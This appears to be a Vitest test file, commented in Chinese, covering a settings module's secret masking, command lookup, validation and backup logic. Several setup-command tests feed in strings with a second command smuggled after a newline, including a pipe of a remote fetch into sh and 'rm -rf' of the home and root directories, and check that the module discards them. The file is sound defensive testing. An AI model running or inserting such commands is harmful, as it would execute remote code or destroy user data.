/**
 * settings-fs（CR-01 + P1-04）：settings 脱敏 + 预览命令 + 读三态分流。
 *
 * 回归点：
 * - /api/settings 默认口径不再泄漏 apiKey / gitToken 明文
 * - /api/preview 的命令只来自 config.json 的 per-repo previewCommand
 * - readSettingsFile：ok / missing / error；坏 JSON 备份一次 config.json.corrupt-<ts>
 */
import { promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";

const TMP_ROOT = path.join(os.tmpdir(), `fe-settings-fs-${Date.now()}`);
process.env.FLOWSHIP_DATA_DIR = TMP_ROOT;

import { COMPANY_ENV_TEMPLATE, emptyCompanyEnv } from "@/lib/company-env";
import { DEFAULT_SETTINGS, normalizeSettings } from "@/lib/local-store";
import { clearFailpoints, setFailpoint } from "@/lib/server/failpoints";
import {
  getRepoPreviewCommand,
  getRepoSetupCommand,
  looksLikeSettings,
  maskSettingsSecrets,
  preserveSecretsOnPut,
  putSettingsFile,
  readSettingsFile,
  settingsFilePath,
  validateSettingsPayload,
} from "@/lib/server/settings-fs";

// 与 client 整对象 PUT 同形：必带 apiKey（字符串）/ defaultModel（对象）/ repos（数组）
const VALID_CONFIG = {
  apiKey: "sk-super-secret-key-1234567890",
  gitToken: "glpat-secret-token",
  defaultModel: { id: "composer-2" },
  repos: [
    {
      name: "web",
      path: "/repo/web",
      previewCommand: "npm run dev",
      setupCommand: "pnpm install --frozen-lockfile",
    },
    { name: "api", path: "/repo/api" },
  ],
  mcpServers: { feishu: { url: "https://x" } },
};

beforeAll(async () => {
  await fs.mkdir(TMP_ROOT, { recursive: true });
  await fs.writeFile(
    path.join(TMP_ROOT, "config.json"),
    JSON.stringify(VALID_CONFIG),
    "utf-8",
  );
});

afterAll(async () => {
  await fs.rm(TMP_ROOT, { recursive: true, force: true });
});

describe("maskSettingsSecrets", () => {
  it("apiKey / gitToken 掩码、不含明文；其它字段原样", async () => {
    const result = await readSettingsFile();
    expect(result.status).toBe("ok");
    if (result.status !== "ok") return;
    const masked = maskSettingsSecrets(result.settings);
    expect(masked.apiKey).not.toContain("super-secret");
    expect(String(masked.apiKey)).toContain("脱敏");
    expect(masked.gitToken).not.toContain("secret-token");
    // 非敏感字段不动（client 回填 mcpServers 依赖）
    expect(masked.mcpServers).toEqual({ feishu: { url: "https://x" } });
    expect(masked.repos).toEqual(result.settings.repos);
  });

  it("未配置的密钥掩码为空串（不显示假掩码）", () => {
    expect(maskSettingsSecrets({ apiKey: "", gitToken: undefined }).apiKey).toBe("");
    expect(maskSettingsSecrets({}).gitToken).toBe("");
  });
});

describe("preserveSecretsOnPut（掩码兜底、清空放行）", () => {
  const disk = { apiKey: "sk-real-key", gitToken: "glpat-real", repos: [1] };

  it("PUT 带脱敏掩码（client 误把展示值回写）→ 保留盘上真值", () => {
    const { settings, preserved } = preserveSecretsOnPut(
      { apiKey: "sk-r…（已脱敏、长度 11）", gitToken: "glpat…（已脱敏、长度 10）", repos: [1, 2] },
      disk,
    );
    expect(settings.apiKey).toBe("sk-real-key");
    expect(settings.gitToken).toBe("glpat-real");
    expect(settings.repos).toEqual([1, 2]); // 非密钥字段照常用进来的
    expect(preserved).toEqual(["apiKey", "gitToken"]);
  });

  it("PUT 带空密钥 → 放行（用户主动清 key 是合法操作、不拦）", () => {
    const { settings, preserved } = preserveSecretsOnPut(
      { apiKey: "", gitToken: "" },
      disk,
    );
    expect(settings.apiKey).toBe("");
    expect(settings.gitToken).toBe("");
    expect(preserved).toEqual([]);
  });

  it("PUT 带新真值 → 正常覆盖", () => {
    const { settings, preserved } = preserveSecretsOnPut(
      { apiKey: "sk-new-key", gitToken: "glpat-new" },
      disk,
    );
    expect(settings.apiKey).toBe("sk-new-key");
    expect(settings.gitToken).toBe("glpat-new");
    expect(preserved).toEqual([]);
  });

  it("盘上本来就空 / 首次落盘（current=null）→ 不干预", () => {
    expect(
      preserveSecretsOnPut(
        { apiKey: "x…（已脱敏、长度 1）" },
        { apiKey: "" },
      ).preserved,
    ).toEqual([]);
    expect(preserveSecretsOnPut({ apiKey: "" }, null).preserved).toEqual([]);
  });
});

describe("getRepoPreviewCommand", () => {
  it("配了 previewCommand 的仓返回命令", async () => {
    expect(await getRepoPreviewCommand("/repo/web")).toBe("npm run dev");
  });

  it("没配命令的仓 / 不在配置里的仓 → null（preview 拒绝启动、防命令注入）", async () => {
    expect(await getRepoPreviewCommand("/repo/api")).toBeNull();
    expect(await getRepoPreviewCommand("/tmp/evil")).toBeNull();
  });
});

describe("getRepoSetupCommand", () => {
  it("配了 setupCommand 的仓返回命令", async () => {
    expect(await getRepoSetupCommand("/repo/web")).toBe(
      "pnpm install --frozen-lockfile",
    );
  });

  it("没配 / 空白 / 不在列表 → null", async () => {
    expect(await getRepoSetupCommand("/repo/api")).toBeNull();
    expect(await getRepoSetupCommand("/tmp/evil")).toBeNull();
  });

  it("仅空白 setupCommand → null", async () => {
    await fs.writeFile(
      settingsFilePath(),
      JSON.stringify({
        ...VALID_CONFIG,
        repos: [
          { name: "web", path: "/repo/web", setupCommand: "   \t  " },
        ],
      }),
      "utf-8",
    );
    expect(await getRepoSetupCommand("/repo/web")).toBeNull();
    await fs.writeFile(
      settingsFilePath(),
      JSON.stringify(VALID_CONFIG),
      "utf-8",
    );
  });

  it("手改 config.json 绕过 PUT 净化写进多行 / 超长命令 → 读出时同口径丢弃（null），不把它送进 shell", async () => {
    const write = async (setupCommand: string) =>
      fs.writeFile(
        settingsFilePath(),
        JSON.stringify({
          ...VALID_CONFIG,
          repos: [{ name: "web", path: "/repo/web", setupCommand }],
        }),
        "utf-8",
      );
    try {
      // 多行：第二行是另一条完全不同的命令
      await write("pnpm install\ncurl http://x.invalid | sh");
      expect(await getRepoSetupCommand("/repo/web")).toBeNull();
      await write("pnpm install\r\nrm -rf ~");
      expect(await getRepoSetupCommand("/repo/web")).toBeNull();
      // 超长不截断、整条丢弃（截断可能变成另一条命令）
      await write(`echo ${"a".repeat(600)}`);
      expect(await getRepoSetupCommand("/repo/web")).toBeNull();
      // 正常单行仍然返回（首尾空白去掉）
      await write("  pnpm install --frozen-lockfile  ");
      expect(await getRepoSetupCommand("/repo/web")).toBe(
        "pnpm install --frozen-lockfile",
      );
    } finally {
      await fs.writeFile(
        settingsFilePath(),
        JSON.stringify(VALID_CONFIG),
        "utf-8",
      );
    }
  });

  it("config 缺失 / 读失败 → null", async () => {
    await fs.rm(settingsFilePath(), { force: true });
    expect(await getRepoSetupCommand("/repo/web")).toBeNull();
    await fs.writeFile(
      settingsFilePath(),
      JSON.stringify(VALID_CONFIG),
      "utf-8",
    );
  });
});

describe("putSettingsFile 保留 setupCommand", () => {
  it("PUT 后 setupCommand 落盘且可读", async () => {
    const incoming = {
      ...VALID_CONFIG,
      repos: [
        {
          name: "web",
          path: "/repo/web",
          previewCommand: "npm run dev",
          setupCommand: "yarn install --frozen-lockfile --prefer-offline",
        },
      ],
    };
    const result = await putSettingsFile(incoming);
    expect(result.status).toBe("ok");
    if (result.status !== "ok") return;
    expect(await getRepoSetupCommand("/repo/web")).toBe(
      "yarn install --frozen-lockfile --prefer-offline",
    );
    await fs.writeFile(
      settingsFilePath(),
      JSON.stringify(VALID_CONFIG),
      "utf-8",
    );
  });

  it("含换行的 setupCommand 落盘时被丢弃", async () => {
    const result = await putSettingsFile({
      ...VALID_CONFIG,
      repos: [
        {
          name: "web",
          path: "/repo/web",
          setupCommand: "pnpm install\nrm -rf /",
        },
      ],
    });
    expect(result.status).toBe("ok");
    if (result.status !== "ok") return;
    const repo = (result.settings.repos as Array<Record<string, unknown>>)[0];
    expect(repo.setupCommand).toBeUndefined();
    await fs.writeFile(
      settingsFilePath(),
      JSON.stringify(VALID_CONFIG),
      "utf-8",
    );
  });
});

describe("readSettingsFile 三态（P1-04）", () => {
  it("文件存在且合法 → status:ok", async () => {
    await fs.writeFile(
      settingsFilePath(),
      JSON.stringify(VALID_CONFIG),
      "utf-8",
    );
    const result = await readSettingsFile();
    expect(result).toEqual({
      status: "ok",
      settings: VALID_CONFIG,
    });
  });

  it("文件不存在（ENOENT）→ status:missing", async () => {
    await fs.rm(settingsFilePath(), { force: true });
    const result = await readSettingsFile();
    expect(result).toEqual({ status: "missing" });
    // 还原合法文件、避免影响后续用例
    await fs.writeFile(
      settingsFilePath(),
      JSON.stringify(VALID_CONFIG),
      "utf-8",
    );
  });

  it("JSON 损坏 → status:error + 备份 config.json.corrupt-<ts>（只备一次）", async () => {
    const corruptRaw = "{ not-valid-json ;;;";
    await fs.writeFile(settingsFilePath(), corruptRaw, "utf-8");
    // 清掉可能残留的旧 backup（本 describe 内首次）
    const dir = path.dirname(settingsFilePath());
    for (const name of await fs.readdir(dir)) {
      if (name.startsWith("config.json.corrupt-")) {
        await fs.rm(path.join(dir, name), { force: true });
      }
    }

    const first = await readSettingsFile();
    expect(first.status).toBe("error");
    if (first.status !== "error") return;
    expect(first.reason).toMatch(/json_parse/);

    const backups = (await fs.readdir(dir)).filter((n) =>
      n.startsWith("config.json.corrupt-"),
    );
    expect(backups).toHaveLength(1);
    const backupContent = await fs.readFile(
      path.join(dir, backups[0]),
      "utf-8",
    );
    expect(backupContent).toBe(corruptRaw);

    // 再读一次：仍 error、不追加第二份 backup
    const second = await readSettingsFile();
    expect(second.status).toBe("error");
    const backupsAfter = (await fs.readdir(dir)).filter((n) =>
      n.startsWith("config.json.corrupt-"),
    );
    expect(backupsAfter).toHaveLength(1);

    // 还原
    await fs.writeFile(
      settingsFilePath(),
      JSON.stringify(VALID_CONFIG),
      "utf-8",
    );
  });

  it("根节点非对象 → status:error 并备份", async () => {
    const dir = path.dirname(settingsFilePath());
    for (const name of await fs.readdir(dir)) {
      if (name.startsWith("config.json.corrupt-")) {
        await fs.rm(path.join(dir, name), { force: true });
      }
    }
    await fs.writeFile(settingsFilePath(), JSON.stringify([1, 2, 3]), "utf-8");
    const result = await readSettingsFile();
    expect(result).toEqual({
      status: "error",
      reason: "settings_json_invalid",
    });
    const backups = (await fs.readdir(dir)).filter((n) =>
      n.startsWith("config.json.corrupt-"),
    );
    expect(backups.length).toBeGreaterThanOrEqual(1);
    await fs.writeFile(
      settingsFilePath(),
      JSON.stringify(VALID_CONFIG),
      "utf-8",
    );
  });
});

describe("F6-02 validateSettingsPayload / looksLikeSettings", () => {
  it("完整配置对象（apiKey 字符串 + defaultModel 对象 + repos 数组）→ 通过，含空串 / 空数组这类「清空」值", () => {
    expect(validateSettingsPayload(VALID_CONFIG)).toBeNull();
    // 用户清 key 的合法做法：完整对象 + apiKey: ""
    expect(validateSettingsPayload({ ...VALID_CONFIG, apiKey: "" })).toBeNull();
    expect(validateSettingsPayload({ ...VALID_CONFIG, repos: [] })).toBeNull();
    // 向前兼容：完整对象 + 陌生键 → 通过
    expect(validateSettingsPayload({ ...VALID_CONFIG, futureField: 1 })).toBeNull();
  });

  it("首次安装：client 整份 DEFAULT_SETTINGS 通过校验（不能被误拒）", () => {
    expect(validateSettingsPayload(DEFAULT_SETTINGS)).toBeNull();
  });

  it("client 唯一的 PUT 入口永远整对象：normalizeSettings 对任何脏输入的产物都过校验（apiKey / defaultModel / repos 必在）", () => {
    const dirty: Array<Parameters<typeof normalizeSettings>[0]> = [
      null,
      {},
      { apiKey: 123 as never },
      { defaultModel: "old-string-schema" as never },
      { repos: "not-an-array" as never },
      { apiKey: undefined, defaultModel: undefined, repos: undefined },
    ];
    for (const parsed of dirty) {
      expect(validateSettingsPayload(normalizeSettings(parsed))).toBeNull();
    }
  });

  it.each<[string, unknown, string[]]>([
    ["只有 apiKey", { apiKey: "" }, ["defaultModel", "repos"]],
    ["只有 repos", { repos: [] }, ["apiKey", "defaultModel"]],
    ["只有一个偏好键", { jumpIde: "cursor" }, ["apiKey", "defaultModel", "repos"]],
    ["缺 defaultModel", { apiKey: "", repos: [] }, ["defaultModel"]],
    ["缺 repos", { apiKey: "", defaultModel: { id: "" } }, ["repos"]],
    ["apiKey 非字符串", { ...VALID_CONFIG, apiKey: 1 }, ["apiKey"]],
    ["defaultModel 是数组", { ...VALID_CONFIG, defaultModel: [] }, ["defaultModel"]],
    ["defaultModel 是 null", { ...VALID_CONFIG, defaultModel: null }, ["defaultModel"]],
    ["repos 是对象", { ...VALID_CONFIG, repos: {} }, ["repos"]],
  ])("残缺配置（%s）→ 拒绝，文案只点名缺失 / 类型不对的字段名", (_name, body, offending) => {
    const msg = validateSettingsPayload(body);
    expect(msg).toEqual(expect.any(String));
    for (const f of ["apiKey", "defaultModel", "repos"]) {
      if (offending.includes(f)) expect(msg).toContain(f);
      else expect(msg).not.toContain(f);
    }
  });

  it("只在原型链上带必需字段不算（只认自有属性）", () => {
    const proto = { apiKey: "", defaultModel: { id: "" }, repos: [] };
    expect(validateSettingsPayload(Object.create(proto))).toEqual(expect.any(String));
  });

  it.each([
    ["数组", []],
    ["非空数组", [{ apiKey: "x" }]],
    ["null", null],
    ["undefined", undefined],
    ["字符串", "apiKey"],
    ["数字", 1],
  ])("%s → 「配置必须是对象」", (_name, body) => {
    expect(validateSettingsPayload(body)).toBe("配置必须是对象");
  });

  it("{} / 只有陌生键 → 拒绝；文案不回显请求内容", () => {
    const empty = validateSettingsPayload({});
    expect(empty).toEqual(expect.any(String));
    const alien = validateSettingsPayload({ secretLooking: "sk-LEAK-ME" });
    expect(alien).toEqual(expect.any(String));
    expect(alien).not.toContain("sk-LEAK-ME");
    expect(alien).not.toContain("secretLooking");
  });

  it("只在原型链上带已知键不算（只认自有属性）", () => {
    expect(looksLikeSettings(Object.create({ apiKey: "x" }))).toBe(false);
  });

  it("DEFAULT_SETTINGS 的每个顶层键单独出现都算 settings——给 FeAiFlowSettings 加了字段却没登记到 settings-fs 的 KNOWN_SETTINGS_KEYS 会红", () => {
    const unregistered = Object.keys(DEFAULT_SETTINGS).filter(
      (k) => !looksLikeSettings({ [k]: (DEFAULT_SETTINGS as unknown as Record<string, unknown>)[k] }),
    );
    expect(unregistered).toEqual([]);
  });

  it("putSettingsFile 自身也兜底（与 route 同口径）：直接传 [] / {} / 残缺对象 → reject，盘上不动、不产生 .bak / .bak.shrink", async () => {
    const raw = JSON.stringify(VALID_CONFIG);
    await fs.writeFile(settingsFilePath(), raw, "utf-8");
    await fs.rm(`${settingsFilePath()}.bak`, { force: true });
    await fs.rm(`${settingsFilePath()}.bak.shrink`, { force: true });
    await expect(putSettingsFile([] as never)).rejects.toThrow();
    await expect(putSettingsFile({})).rejects.toThrow();
    await expect(putSettingsFile({ repos: [] })).rejects.toThrow();
    await expect(putSettingsFile({ apiKey: "" })).rejects.toThrow();
    await expect(
      putSettingsFile({ apiKey: "", defaultModel: [], repos: [] } as never),
    ).rejects.toThrow();
    expect(await fs.readFile(settingsFilePath(), "utf-8")).toBe(raw);
    for (const suffix of [".bak", ".bak.shrink"]) {
      await expect(fs.stat(`${settingsFilePath()}${suffix}`)).rejects.toMatchObject({
        code: "ENOENT",
      });
    }
  });
});

describe("F6-02 putSettingsFile：损坏拒写 + 覆盖前备份 config.json.bak", () => {
  const bakPath = (): string => `${settingsFilePath()}.bak`;
  const modeOf = async (p: string): Promise<number> =>
    (await fs.stat(p)).mode & 0o777;
  const exists = (p: string): Promise<boolean> =>
    fs.stat(p).then(
      () => true,
      () => false,
    );
  // readSettingsFile 遇损坏会顺手落 config.json.corrupt-<ts>；每个用例前后清掉、互不串扰
  const cleanDir = async (): Promise<void> => {
    const dir = path.dirname(settingsFilePath());
    for (const name of await fs.readdir(dir)) {
      if (
        name.startsWith("config.json.corrupt-") ||
        name === "config.json.bak" ||
        name === "config.json.bak.shrink" ||
        name.includes(".tmp.")
      ) {
        await fs.rm(path.join(dir, name), { force: true });
      }
    }
  };
  const resetTo = async (raw: string | null): Promise<void> => {
    await cleanDir();
    if (raw === null) await fs.rm(settingsFilePath(), { force: true });
    else await fs.writeFile(settingsFilePath(), raw, "utf-8");
  };

  afterEach(async () => {
    clearFailpoints();
    await cleanDir();
    await fs.writeFile(settingsFilePath(), JSON.stringify(VALID_CONFIG), "utf-8");
  });

  it("config.json 损坏（JSON 不可解析）→ 拒写 unreadable，原文件逐字节不动、也不生成 .bak", async () => {
    const corruptRaw = "{ broken ;;; apiKey: sk-should-stay";
    await resetTo(corruptRaw);
    const result = await putSettingsFile({ ...VALID_CONFIG, apiKey: "sk-new" });
    expect(result.status).toBe("unreadable");
    expect(await fs.readFile(settingsFilePath(), "utf-8")).toBe(corruptRaw);
    expect(await exists(bakPath())).toBe(false);
  });

  it("config.json 根节点是数组（读侧判损坏）→ 同样拒写、原文件不动", async () => {
    await resetTo("[]");
    const result = await putSettingsFile({ ...VALID_CONFIG });
    expect(result.status).toBe("unreadable");
    expect(await fs.readFile(settingsFilePath(), "utf-8")).toBe("[]");
    expect(await exists(bakPath())).toBe(false);
  });

  it("损坏文件不会覆盖掉一份好备份", async () => {
    const goodBak = JSON.stringify({ ...VALID_CONFIG, apiKey: "sk-good-backup" });
    await resetTo("{ broken");
    await fs.writeFile(bakPath(), goodBak, "utf-8");
    const result = await putSettingsFile({ ...VALID_CONFIG });
    expect(result.status).toBe("unreadable");
    expect(await fs.readFile(bakPath(), "utf-8")).toBe(goodBak);
  });

  it("成功写之前先备份：.bak = 覆盖前的内容、config.json = 新内容，无 tmp 残留", async () => {
    await resetTo(JSON.stringify(VALID_CONFIG));
    const result = await putSettingsFile({ ...VALID_CONFIG, apiKey: "sk-new" });
    expect(result.status).toBe("ok");
    expect(JSON.parse(await fs.readFile(bakPath(), "utf-8"))).toEqual(
      VALID_CONFIG,
    );
    expect(JSON.parse(await fs.readFile(settingsFilePath(), "utf-8")).apiKey).toBe(
      "sk-new",
    );
    const leftovers = (await fs.readdir(path.dirname(settingsFilePath()))).filter(
      (n) => n.includes(".tmp."),
    );
    expect(leftovers).toEqual([]);
  });

  it.skipIf(process.platform === "win32")(
    "备份里有 API key / PAT：权限 0600（与 config.json 同级收紧）",
    async () => {
      await resetTo(JSON.stringify(VALID_CONFIG));
      // 预置一份 0644 的旧 .bak：rename 覆盖后也必须被收紧
      await fs.writeFile(bakPath(), "{}", { encoding: "utf-8", mode: 0o644 });
      await fs.chmod(bakPath(), 0o644);
      const result = await putSettingsFile({ ...VALID_CONFIG, apiKey: "sk-new" });
      expect(result.status).toBe("ok");
      expect(await modeOf(bakPath())).toBe(0o600);
      expect(await modeOf(settingsFilePath())).toBe(0o600);
    },
  );

  it("备份先于主写：主写失败时 .bak 已是覆盖前的配置、config.json 仍是原样", async () => {
    await resetTo(JSON.stringify(VALID_CONFIG));
    // 每次原子写都要过一次 rename：第 1 次 = 备份、第 2 次 = 主写——让第 2 次抛错
    let renames = 0;
    setFailpoint("rename.beforeAttempt", () => {
      renames += 1;
      if (renames >= 2) throw new Error("模拟主写失败");
    });
    await expect(
      putSettingsFile({ ...VALID_CONFIG, apiKey: "sk-never-written" }),
    ).rejects.toThrow("模拟主写失败");
    expect(JSON.parse(await fs.readFile(bakPath(), "utf-8"))).toEqual(
      VALID_CONFIG,
    );
    expect(JSON.parse(await fs.readFile(settingsFilePath(), "utf-8"))).toEqual(
      VALID_CONFIG,
    );
  });

  it("首次落盘（config 缺失）→ 没有可备份的内容、不生成 .bak", async () => {
    await resetTo(null);
    const result = await putSettingsFile({ ...VALID_CONFIG });
    expect(result.status).toBe("ok");
    expect(await exists(bakPath())).toBe(false);
  });

  it("覆盖前的 config 是空对象 / 不含任何已知键（手改残留）→ 不拿它顶掉一份好备份", async () => {
    const goodBak = JSON.stringify({ ...VALID_CONFIG, apiKey: "sk-good-backup" });
    await resetTo("{}");
    await fs.writeFile(bakPath(), goodBak, "utf-8");
    const result = await putSettingsFile({ ...VALID_CONFIG });
    expect(result.status).toBe("ok");
    expect(await fs.readFile(bakPath(), "utf-8")).toBe(goodBak);
  });

  it("备份失败（.bak 位置被目录占着）只 warn、不阻断保存", async () => {
    await resetTo(JSON.stringify(VALID_CONFIG));
    await fs.mkdir(bakPath());
    try {
      const result = await putSettingsFile({ ...VALID_CONFIG, apiKey: "sk-new" });
      expect(result.status).toBe("ok");
      expect(
        JSON.parse(await fs.readFile(settingsFilePath(), "utf-8")).apiKey,
      ).toBe("sk-new");
    } finally {
      await fs.rm(bakPath(), { recursive: true, force: true });
    }
  });
});

describe("第六轮：收缩备份 config.json.bak.shrink（putSettingsFile 落盘入口）", () => {
  const bakPath = (): string => `${settingsFilePath()}.bak`;
  const shrinkPath = (): string => `${settingsFilePath()}.bak.shrink`;
  const exists = (p: string): Promise<boolean> =>
    fs.stat(p).then(
      () => true,
      () => false,
    );
  const modeOf = async (p: string): Promise<number> =>
    (await fs.stat(p)).mode & 0o777;
  const cleanDir = async (): Promise<void> => {
    const dir = path.dirname(settingsFilePath());
    for (const name of await fs.readdir(dir)) {
      if (
        name.startsWith("config.json.corrupt-") ||
        name === "config.json.bak" ||
        name === "config.json.bak.shrink" ||
        name.includes(".tmp.")
      ) {
        await fs.rm(path.join(dir, name), { recursive: true, force: true });
      }
    }
  };
  const resetTo = async (raw: string | null): Promise<void> => {
    await cleanDir();
    if (raw === null) await fs.rm(settingsFilePath(), { force: true });
    else await fs.writeFile(settingsFilePath(), raw, "utf-8");
  };
  const readJson = async (p: string): Promise<unknown> =>
    JSON.parse(await fs.readFile(p, "utf-8"));

  afterEach(async () => {
    vi.restoreAllMocks();
    clearFailpoints();
    await cleanDir();
    await fs.writeFile(settingsFilePath(), JSON.stringify(VALID_CONFIG), "utf-8");
  });

  // 「非空」口径（注释见 settings-fs.ts）：只对「凭据与列表类」键判收缩——
  // apiKey / gitToken（非空串）、repos（非空数组）、mcpServers（有键的对象）；customProviders / companyEnv 见下方专项。
  // 每行：previous 里该键的值 → incoming 里该键的值（undefined = 该键缺失），其余键两边完全一致，
  // 所以是否写出 .bak.shrink 只取决于这一个键。
  const NOT_PRESENT = undefined;
  const REPO_A = { name: "a", path: "/repo/a" };
  const REPO_B = { name: "b", path: "/repo/b" };
  it.each<[string, string, unknown, unknown, boolean]>([
    ["非空串 → 空串", "gitToken", "glpat-x", "", true],
    ["非空串 → 缺失", "gitToken", "glpat-x", NOT_PRESENT, true],
    ["非空数组 → 空数组", "repos", [REPO_A], [], true],
    ["有键的对象 → 空对象", "mcpServers", { feishu: { url: "https://x" } }, {}, true],
    ["有键的对象 → 缺失", "mcpServers", { feishu: { url: "https://x" } }, NOT_PRESENT, true],
    // 下面都不算收缩
    ["空串 → 非空串", "gitToken", "", "glpat-new", false],
    ["空串 → 空串", "gitToken", "", "", false],
    ["缺失 → 缺失", "gitToken", NOT_PRESENT, NOT_PRESENT, false],
    ["空数组 → 非空数组", "repos", [], [REPO_A], false],
    ["空对象 → 缺失（本来就是空）", "mcpServers", {}, NOT_PRESENT, false],
    ["数字 → 缺失（数字按空处理）", "gitToken", 5, NOT_PRESENT, false],
    ["null → 缺失（null 按空处理）", "gitToken", null, NOT_PRESENT, false],
    ["非空串 → 另一个非空串", "gitToken", "glpat-x", "glpat-y", false],
    ["非空数组 → 元素变少但仍非空", "repos", [REPO_A, REPO_B], [REPO_A], false],
    ["有键的对象 → 另一个有键的对象", "mcpServers", { a: 1 }, { b: 2 }, false],
  ])("%s（键 %s）", async (_name, key, before, after, shrinks) => {
    const build = (v: unknown): Record<string, unknown> => {
      const cfg: Record<string, unknown> = { ...VALID_CONFIG };
      if (v === NOT_PRESENT) delete cfg[key];
      else cfg[key] = v;
      return cfg;
    };
    const previous = build(before);
    await resetTo(JSON.stringify(previous));
    const result = await putSettingsFile(build(after));
    expect(result.status).toBe("ok");
    expect(await exists(shrinkPath())).toBe(shrinks);
    if (shrinks) expect(await readJson(shrinkPath())).toEqual(previous);
  });

  it("apiKey / repos 被清空算收缩（完整对象 + 清空值）；defaultModel 是偏好、不算（第七轮 P2-1）", async () => {
    for (const patch of [{ apiKey: "" }, { repos: [] }] as const) {
      await resetTo(JSON.stringify(VALID_CONFIG));
      const result = await putSettingsFile({ ...VALID_CONFIG, ...patch });
      expect(result.status).toBe("ok");
      expect(await readJson(shrinkPath())).toEqual(VALID_CONFIG);
    }
    await resetTo(JSON.stringify(VALID_CONFIG));
    const pref = await putSettingsFile({ ...VALID_CONFIG, defaultModel: {} });
    expect(pref.status).toBe("ok");
    expect(await exists(shrinkPath())).toBe(false);
  });

  it("写入次序：先 .bak.shrink、再 .bak 滚动、最后 config.json；三份内容各是 previous / previous / 新配置、无 tmp 残留", async () => {
    await resetTo(JSON.stringify(VALID_CONFIG));
    const finals: string[] = [];
    const realRename = fs.rename.bind(fs);
    vi.spyOn(fs, "rename").mockImplementation(async (from, to) => {
      finals.push(path.basename(String(to)));
      return realRename(from, to);
    });
    const next = { ...VALID_CONFIG, repos: [] };
    const result = await putSettingsFile(next);
    expect(result.status).toBe("ok");
    expect(finals).toEqual(["config.json.bak.shrink", "config.json.bak", "config.json"]);
    expect(await readJson(shrinkPath())).toEqual(VALID_CONFIG);
    expect(await readJson(bakPath())).toEqual(VALID_CONFIG);
    expect(await readJson(settingsFilePath())).toEqual(next);
    const leftovers = (await fs.readdir(path.dirname(settingsFilePath()))).filter(
      (n) => n.includes(".tmp."),
    );
    expect(leftovers).toEqual([]);
  });

  it.skipIf(process.platform === "win32")(
    ".bak.shrink 含旧完整配置（API key / PAT）：权限 0600，已有的 0644 旧文件也被收紧",
    async () => {
      await resetTo(JSON.stringify(VALID_CONFIG));
      await fs.writeFile(shrinkPath(), "{}", { encoding: "utf-8", mode: 0o644 });
      await fs.chmod(shrinkPath(), 0o644);
      const result = await putSettingsFile({ ...VALID_CONFIG, repos: [] });
      expect(result.status).toBe("ok");
      expect(await modeOf(shrinkPath())).toBe(0o600);
    },
  );

  it("普通保存不碰 .bak.shrink：预置的旧收缩备份逐字节不变（.bak 照常滚动）", async () => {
    await resetTo(JSON.stringify(VALID_CONFIG));
    const oldShrink = JSON.stringify({ ...VALID_CONFIG, apiKey: "sk-from-an-earlier-shrink" });
    await fs.writeFile(shrinkPath(), oldShrink, "utf-8");
    for (const apiKey of ["sk-n1", "sk-n2", "sk-n3"]) {
      const beforeThis = await readJson(settingsFilePath());
      const result = await putSettingsFile({ ...VALID_CONFIG, apiKey });
      expect(result.status).toBe("ok");
      expect(await fs.readFile(shrinkPath(), "utf-8")).toBe(oldShrink);
      expect(await readJson(bakPath())).toEqual(beforeThis);
    }
  });

  it("掩码回写（apiKey 被还原成盘上真值）本身不算收缩；同时清了 gitToken → 才算，.bak.shrink 里是还原前的完整旧配置", async () => {
    const masked = `sk-s…（已脱敏、长度 ${VALID_CONFIG.apiKey.length}）`;
    await resetTo(JSON.stringify(VALID_CONFIG));
    const onlyMasked = await putSettingsFile({ ...VALID_CONFIG, apiKey: masked });
    expect(onlyMasked.status).toBe("ok");
    if (onlyMasked.status === "ok") {
      expect(onlyMasked.settings.apiKey).toBe(VALID_CONFIG.apiKey);
    }
    expect(await exists(shrinkPath())).toBe(false);

    await resetTo(JSON.stringify(VALID_CONFIG));
    const maskedAndCleared = await putSettingsFile({
      ...VALID_CONFIG,
      apiKey: masked,
      gitToken: "",
    });
    expect(maskedAndCleared.status).toBe("ok");
    expect(await readJson(shrinkPath())).toEqual(VALID_CONFIG);
  });

  it("首次落盘（config 缺失）/ 覆盖前是空对象（手改残留）→ 没有可备份的内容、不写 .bak.shrink", async () => {
    await resetTo(null);
    expect((await putSettingsFile({ ...VALID_CONFIG, repos: [] })).status).toBe("ok");
    expect(await exists(shrinkPath())).toBe(false);

    const goodShrink = JSON.stringify({ ...VALID_CONFIG, apiKey: "sk-good-shrink" });
    await resetTo("{}");
    await fs.writeFile(shrinkPath(), goodShrink, "utf-8");
    expect((await putSettingsFile({ ...VALID_CONFIG, repos: [] })).status).toBe("ok");
    expect(await fs.readFile(shrinkPath(), "utf-8")).toBe(goodShrink);
  });

  it("config.json 损坏 → 拒写 unreadable：不写 .bak.shrink、已有的好收缩备份不被动", async () => {
    const goodShrink = JSON.stringify({ ...VALID_CONFIG, apiKey: "sk-good-shrink" });
    await resetTo("{ broken ;;;");
    await fs.writeFile(shrinkPath(), goodShrink, "utf-8");
    const result = await putSettingsFile({ ...VALID_CONFIG, repos: [] });
    expect(result.status).toBe("unreadable");
    expect(await fs.readFile(shrinkPath(), "utf-8")).toBe(goodShrink);
  });

  it("备份失败（.bak.shrink 位置被目录占着）只 warn、不阻断保存，.bak 照常滚动；日志不含配置内容", async () => {
    await resetTo(JSON.stringify(VALID_CONFIG));
    await fs.mkdir(shrinkPath());
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const next = { ...VALID_CONFIG, repos: [] };
    const result = await putSettingsFile(next);
    expect(result.status).toBe("ok");
    expect(await readJson(settingsFilePath())).toEqual(next);
    expect(await readJson(bakPath())).toEqual(VALID_CONFIG);
    const logged = JSON.stringify(warn.mock.calls);
    expect(logged).toContain("bak.shrink");
    expect(logged).not.toContain(VALID_CONFIG.apiKey);
    expect(logged).not.toContain(VALID_CONFIG.gitToken);
  });

  it("主写失败时：.bak.shrink 与 .bak 都已是覆盖前的配置、config.json 仍是原样", async () => {
    await resetTo(JSON.stringify(VALID_CONFIG));
    // 每次原子写都过一次 rename：第 1 次 = .bak.shrink、第 2 次 = .bak、第 3 次 = 主写——让第 3 次抛错
    let renames = 0;
    setFailpoint("rename.beforeAttempt", () => {
      renames += 1;
      if (renames >= 3) throw new Error("模拟主写失败");
    });
    await expect(
      putSettingsFile({ ...VALID_CONFIG, repos: [] }),
    ).rejects.toThrow("模拟主写失败");
    expect(await readJson(shrinkPath())).toEqual(VALID_CONFIG);
    expect(await readJson(bakPath())).toEqual(VALID_CONFIG);
    expect(await readJson(settingsFilePath())).toEqual(VALID_CONFIG);
  });
});

